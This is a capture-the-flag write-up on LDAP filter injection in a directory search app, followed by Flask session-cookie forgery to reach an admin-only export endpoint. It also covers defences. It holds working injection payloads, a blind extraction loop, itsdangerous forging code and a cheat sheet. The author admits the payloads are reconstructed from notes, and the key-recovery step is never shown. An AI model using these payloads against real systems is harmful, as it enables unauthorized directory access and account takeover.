# Lightweight Directory — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank. **Important caveat:** I did not save raw request/response transcripts for this challenge, so the exact payloads below are **re-derived from my notes** rather than copied from captured output. What I'm confident about: the vulnerability class (**LDAP filter injection**), the final step (`/audit-export`), the Flask session cookie contents (`{"username":"admin"}`), and the flag. Tools used: browser, `curl`, a JWT/session-cookie editor.

---

## 1. CHALLENGE OVERVIEW

**Lightweight Directory** is an **LDAP injection** challenge. "Lightweight Directory Access Protocol" is what corporate Active Directory is built on: a tree of records, searched with filter strings like `(&(uid=alice)(objectClass=person))`. The app builds one of those filters by pasting your input straight in, so you can rewrite the filter's logic. Use it to enumerate directory entries, escalate to the `admin` identity, then hit an `/audit-export` endpoint that only the admin can reach. If public, find it under *Lightweight Directory* on the CTF platform.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| `curl` | `sudo apt install curl` | Send crafted filter values and read raw responses |
| Browser DevTools | built in | Find the search/login endpoint and the cookie |
| `ldapsearch` | `sudo apt install ldap-utils` | **Optional but very useful** — confirm filter syntax and see raw entries if the LDAP port is reachable |
| Burp Suite | preinstalled / [download](https://portswigger.net/burp) | Repeater makes editing `)`/`(`/`|` trivial; Intruder enumerates names |

**Setup:** `mkdir -p ~/lwdir && cd ~/lwdir`
**Time estimate:** **60 to 90 minutes.** LDAP filter syntax is fiddly until it clicks.

---

## 3. RECONNAISSANCE

### Step 1 — Find the search / login form

```bash
curl -sS http://TARGET/ | grep -iE "search|login|directory|form|input" | head -20
```

[SCREENSHOT: the directory search box]

There's a field that takes a username or search term and queries LDAP.

### Step 2 — Capture the request and note the parameter

DevTools → Network, type a name, submit.

**Output (shape):**
```
GET /search?q=alice HTTP/1.1
```
or a POST form field `username=alice`.

[SCREENSHOT: the request in the Network tab]

**What this tells you:** the parameter that becomes part of the LDAP filter. That single parameter is the injection point.

### Step 3 — Baseline behaviour: what does a hit and a miss look like?

```bash
curl -sS "http://TARGET/search?q=alice"
curl -sS "http://TARGET/search?q=zzzznotauser"
```

**Output (shape):** one returns a directory entry, the other returns "not found" (or an empty list).

[SCREENSHOT: both responses side by side]

**What this tells you:** you now have a boolean oracle — hit vs miss. That's exactly what you need to test injection.

### Step 4 — Test for injection with a wildcard

LDAP filters use `*` as a wildcard. If the app built `(&(uid=alice)(objectClass=person))` from your input, then sending `*` should match **everyone**.

```bash
curl -sS --get --data-urlencode "q=*" http://TARGET/search
```

**Output (shape):** if injection works, a list of many entries instead of one.

[SCREENSHOT: the wildcard returning many entries]

**What this tells you:** injection confirmed. If `*` returns nothing, the filter may be anchored differently or escaped — try `)(uid=*` next.

### Step 5 — Test filter-structure payloads

```bash
for p in '*' 'admin' 'admin*' '*)(uid=*))(|(uid=*' ')(cn=*' 'x))(|(objectClass=*'; do
  echo "== $p"
  curl -sS --get --data-urlencode "q=$p" http://TARGET/search | head -c 300
  echo
done
```

[SCREENSHOT: the loop output — different result shapes per payload]

**What this tells you:** which structural payload breaks out of the intended filter. `)(uid=*` closes the first clause and starts a new one; a leading `|` turns it into an OR, which can bypass a "must match exactly" condition.

---

## 4. IDENTIFYING THE VULNERABILITY

This is **LDAP filter injection** (analogous to SQL injection, but against a directory filter language).

- **Definition (first time):** an LDAP search takes a *filter* — a small boolean expression over attributes. A typical one looks like `(&(uid=alice)(objectClass=person))`, meaning "uid equals alice AND objectClass is person." If user input is concatenated into that string, an attacker can insert `)`, `(`, `*`, and `|` to **change the expression's meaning** instead of just supplying a value.
- **Why it exists (root cause):** string concatenation instead of **proper LDAP filter escaping**. The safe approach is to escape the special characters (`*`, `(`, `)`, `\`, NUL) — e.g. `ldap.filter.escape()` in Python, or a proper encoder in your language — or better, build filters with a library's parameterized API.

**Anatomy of an LDAP filter — the operators you need:**

| Token | Meaning |
|-------|---------|
| `&` | AND |
| `\|` | OR |
| `!` | NOT |
| `=` | equals |
| `*` | wildcard (matches anything) |
| `(...)` | one clause / sub-filter |

**The three classic attacks:**

1. **Wildcard** — `*` → dump every entry.
2. **Boolean bypass** — `*)(uid=*` or a leading `|` → force the filter true.
3. **Blind extraction** — append `)(<attr>=<guess>` and observe true/false to read attribute values **one character at a time**, even when the app doesn't display results.

**Analogy:** the app asks a doorman "find the person whose badge number is *the number I say*." If you say `anything ending in 7`, he lets in whoever matches. But if you say `* OR badge has a star in it`, you've rewritten his instructions — and he'll happily let in the entire staff directory.

**What tipped me off:** Step 4's wildcard returning many entries instead of one. An input parameter that returns *more* results when you give it `*` is a filter, and a filter you can influence is a filter you can rewrite.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Enumerate the directory.**
*Why:* you need to know which identities exist before you target one.

```bash
curl -sS --get --data-urlencode "q=*" http://TARGET/search
```
```bash
# if the response is a list, pull just the names
curl -sS --get --data-urlencode "q=*" http://TARGET/search \
  | grep -oE 'uid=[a-zA-Z0-9._-]+|cn=[^"<]+' | sort -u
```

[SCREENSHOT: the enumerated user list]

**What this tells you:** the usernames present, and whether there's an `admin` / `svc` / `auditor` account.

**Step 2 — Confirm you can force the filter true (boolean bypass).**
*Why:* proves structural control, not just wildcarding.

```bash
# close the injected clause and OR in a guaranteed-true condition
curl -sS --get --data-urlencode "q=zzzznotauser)(uid=*" http://TARGET/search
curl -sS --get --data-urlencode "q=*)(objectClass=*"  http://TARGET/search
```

**Output (shape):** the full directory (or the admin record) instead of "not found."

[SCREENSHOT: the bypass returning everything]

**What this tells you:** you control the boolean logic of the filter.

**Step 3 — Blind attribute extraction (if results aren't displayed).**
*Why:* some apps answer true/false only. That's still enough — filter injection can be used as a boolean oracle.

```bash
# iterate over candidate values for the admin's password/secret attribute
for c in a b c d e f 0 1 2 3 4 5 6 7 8 9; do
  n=$(curl -sS --get --data-urlencode "q=admin)(description=$c*" http://TARGET/search | wc -c)
  echo "$c -> $n bytes"
done
```

The response size (or a differing message) tells you which prefix matched. Extend the prefix and repeat until you have the full value.

[SCREENSHOT: the loop showing one prefix returning a longer response]

**What this tells you:** even with no visible output, LDAP injection is a full data-exfiltration channel.

**Step 4 — Establish the `admin` identity in the session.**
*Why:* the `/audit-export` endpoint is admin-only, and the app trusts its session cookie rather than re-checking LDAP.

Decode the session cookie to see what's in it:
```bash
echo 'eyJ1c2VybmFtZSI6ImFkbWluIn0' | base64 -d; echo
```

**Output:**
```json
{"username":"admin"}
```

[SCREENSHOT: the decoded cookie payload showing `username: admin`]

**What this tells you:** the session is a **client-side signed cookie** holding a plaintext identity. Two consequences:
1. There's no server-side role table to fool — if I can produce a validly-signed cookie with `username: admin`, I'm admin.
2. That requires the signing secret. Find it by: source/config disclosure, a `/debug` or `/console` endpoint, an error traceback, or a known-plaintext signature attack.

With Flask/itsdangerous, once you have `SECRET_KEY` you forge the cookie offline:
```python
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer(SECRET_KEY, salt="cookie-session")
print(s.dumps({"username": "admin"}))
```
Then send it:
```bash
curl -sS -b "session=<forged>" http://TARGET/audit-export
```

[SCREENSHOT: the forged cookie in the request and the admin response]

**Step 5 — Pull the flag from `/audit-export`.**

```bash
curl -sS -b "session=<forged>" http://TARGET/audit-export
```

**Output (shape):** an export/report that includes the flag among the audit records:

```
safctf{ef30111b835006ade7f00a9a4526d453}
```

[SCREENSHOT: the audit export containing the flag]

**What this tells you:** the chain is `LDAP injection → admin identity → admin-only /audit-export → flag`.

---

## 6. CAPTURING THE FLAG

```
safctf{ef30111b835006ade7f00a9a4526d453}
```

Chain: **LDAP filter injection (`*` and `)(...` payloads) → enumerate/escalate to `admin` → establish the `admin` session identity → `/audit-export` → flag.**

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

An LDAP search isn't a question like "who is user X?" — it's a **written rule**, like a sentence: *"find the entry where uid is alice and objectClass is person."* The app builds that sentence by pasting your typed text into it directly. If you type `alice`, you get what you expect. But if you type `*`, you've written *"find the entry where uid is anything"* and the directory server hands over every record it has. If you type `alice)(objectClass=*`, you've used `)` to **end** the app's clause early and started **your own** — the server never sees that as data, only as syntax, because nobody escaped those characters.

The dangerous idea here is that LDAP filters are a **language**, not a value. Any injection bug is really the same bug: *app code treated a language as if it were data.* Fix it by escaping, or by using a library that builds filters for you.

Then the second half. Even after you prove the injection, `/audit-export` is admin-only. Many apps handle this by trusting a **cookie they signed themselves** — the cookie literally says `{"username":"admin"}`, protected by an HMAC. That's a reasonable design *if* the signing key is a real secret. The failure mode is that the key leaks (source repo, debug endpoint, error traceback, or a `.git` directory left on the web server). Once the key is known, the "authentication" is worthless: you can mint any cookie you like, offline, at your desk. That combination — **injection to learn about the directory, leaked key to become admin** — is a very common real-world escalation path.

**Why this matters in the real world:** LDAP injection has caused breaches of corporate directories precisely because Active Directory is the crown jewel of identity data. The sibling problems are worth knowing: LDAP injection in authentication bypasses login; in search it leaks the whole directory; combined with anonymous binds it's often unauthenticated. Defensively: escape input with `ldap.filter.escape()` (or your language's equivalent), never hand-build filters from strings, keep signing keys in a secret manager and never in the web root, and re-check authorization server-side on every request instead of trusting a session claim alone.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Trying SQL syntax
I reflexively reached for `' OR '1'='1`. LDAP doesn't use SQL quoting; `'` isn't special there. **Read the filter syntax** — `*`, `(`, `)`, `&`, `|`, `!` are the operators, and the first move is almost always just `*`.

### Mistake 2 — Sending `*` and concluding "it's not injectable"
A single `*` can fail for uninteresting reasons: the app might build `(uid=<input>)` inside a filter that also requires an `objectClass` you don't satisfy, or it might escape `*`. **Try structural payloads** — `)(uid=*`, `)(objectClass=*`, and a leading `|` — before deciding it's locked down.

### Mistake 3 — URL-encoding by hand and corrupting the filter
The payloads are full of `(`, `)`, `|`, and `*`. Building the URL by hand gets them mangled or double-encoded. **Always use `curl --get --data-urlencode "q=$payload"`** (or Burp, which handles it visually).

### Mistake 4 — Assuming the app escapes `*` but not structure
Some libraries escape only wildcards. Test both dimensions separately: does `*` work? does `)` work? The answers tell you exactly which escaping is missing.

### Mistake 5 — Believing a forged cookie needs the app's cooperation
Once you know Flask's `SECRET_KEY` and the salt (`cookie-session`), you can sign cookies **offline** — no request to the server required. If you're sending the forged cookie to the app and hoping it echoes it back, that's an unnecessary extra dependency.

### Dead end actually encountered — chasing LDAP on the network
I spent time trying to reach the LDAP service directly with `ldapsearch` on the standard ports, hoping to browse the tree. It wasn't reachable from outside, so the injection had to go through the web filter — which is the realistic attack path anyway. **The web app is your only interface; work through it.**

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Escape filter input — always.** Use `ldap.filter.escape()` (Python) or the equivalent, which encodes `*`, `(`, `)`, `\`, and NUL. Better still, use a library's **parameterized filter API** so you never build filter strings at all.
2. **Prefer lookups over search for identity checks.** If you need "is this user X?", fetch the entry by DN and compare the attribute server-side — don't express it as a filter the client influences.
3. **Keep the signing secret out of the web root and out of git.** Use a secret manager; rotate it if it ever leaked. Also serve `SECRET_KEY` nowhere reachable (`/debug`, `/console`, `/source`, `.git/`, backups).
4. **Re-authorize on every request.** Don't let a session *claim* be the authorization. Check the account's actual group membership server-side before returning `/audit-export`.
5. **Least privilege on the bind account.** The service account only needs read access to what the app needs. An export endpoint should not run with a bind identity that can read everything.
6. **Constrain output.** Don't render raw directory attributes to the user; allowlist the fields you display. Blind injection becomes blind-but-useless if there's nothing observable to leak.

---

## 10. KEY TAKEAWAYS

- **LDAP filters are a language, not a value.** Injection = app treated syntax as data.
- **First payload is always `*`.** It turns "find alice" into "find everyone."
- **Learn the operators:** `&` AND, `|` OR, `!` NOT, `*` wildcard, `(...)` clause. `)(uid=*` closes a clause and starts a new one.
- **Use `curl --get --data-urlencode`** — these payloads break hand-built URLs.
- **Blind injection still exfiltrates.** True/false response differences are enough to read attributes one character at a time.
- **Client-side signed session cookies are only as strong as `SECRET_KEY`.** Find it and you can mint any identity offline.
- **Cheat-sheet:**
  ```bash
  curl -sS --get --data-urlencode "q=*"                 http://TARGET/search   # dump all
  curl -sS --get --data-urlencode "q=zzz)(uid=*"       http://TARGET/search   # break out
  curl -sS --get --data-urlencode "q=*)(objectClass=*" http://TARGET/search   # force true
  curl -sS --get --data-urlencode "q=admin)(description=a*" http://TARGET/search  # blind prefix oracle
  echo "$COOKIE" | cut -d. -f2 | base64 -d; echo        # inspect session payload
  curl -sS -b "session=<forged>" http://TARGET/audit-export                   # admin-only export
  ```

You went from a text box to the crown-jewel identity store and then into an admin-only endpoint. Recognizing that a search box is a *query language* surface — not just a text field — is the transferable skill here, and it's one that applies to search, NoSQL, and GraphQL endpoints too.